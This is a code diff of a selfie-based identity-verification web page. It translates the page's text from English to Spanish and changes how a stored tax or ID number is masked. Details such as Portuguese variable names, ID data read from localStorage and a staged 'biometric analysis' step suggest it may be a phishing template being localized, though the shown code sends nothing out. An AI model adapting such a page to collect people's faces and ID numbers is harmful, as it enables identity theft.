@@ -139,7 +139,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <video id="video" autoplay playsinline muted></video>
       <img id="snap" alt="" style="display:none"/>
     </div>
-    <div class="hint" id="camHint">Starting camera...</div>
+    <div class="hint" id="camHint">Iniciando cámara...</div>
     <!-- fallback file input for mobile -->
     <input type="file" accept="image/*" capture="user" id="fileInput" style="display:none"/>
     <div class="actions" id="camActions">
@@ -150,7 +150,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
   <!-- PROCESSING -->
   <div class="card cam" id="procView">
-    <h1>Verifying identity</h1>
+    <h1>Verificando identidad</h1>
     <div class="hint" id="procStep">Analizando biometría...</div>
     <div class="frame ok"><img id="snapPreview" alt=""/></div>
     <div style="height:6px;background:#f3f4f6;border-radius:4px;margin-top:16px;overflow:hidden"><div id="bar" style="height:100%;width:0;background:#0a0a0a;transition:width .4s"></div></div>
@@ -168,7 +168,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   var p = nome.split(/\s+/);
   document.getElementById('userName').textContent = ((p[0]||'customer')+' '+(p.slice(-1)[0]||'')).trim().toLowerCase();
   var nif = (localStorage.getItem('nif')||'').replace(/\D/g,'');
-  if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
+  if(nif.length>=18) document.getElementById('userNif').textContent = nif.slice(0,4)+' *** '+nif.slice(-4);
 
   var stream=null, video=document.getElementById('video'), snap=document.getElementById('snap');
   var startBtn=document.getElementById('startBtn'), captureBtn=document.getElementById('captureBtn');
@@ -186,7 +186,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:720},height:{ideal:960}},audio:false});
       video.srcObject = stream;
       video.onloadedmetadata = function(){
-        camHint.textContent = 'Ready! Once you are well positioned, tap "Tomar foto".';
+        camHint.textContent = '¡Listo! Cuando estés bien posicionado, toca "Tomar foto".';
         captureBtn.disabled = false;
       };
     }catch(e){
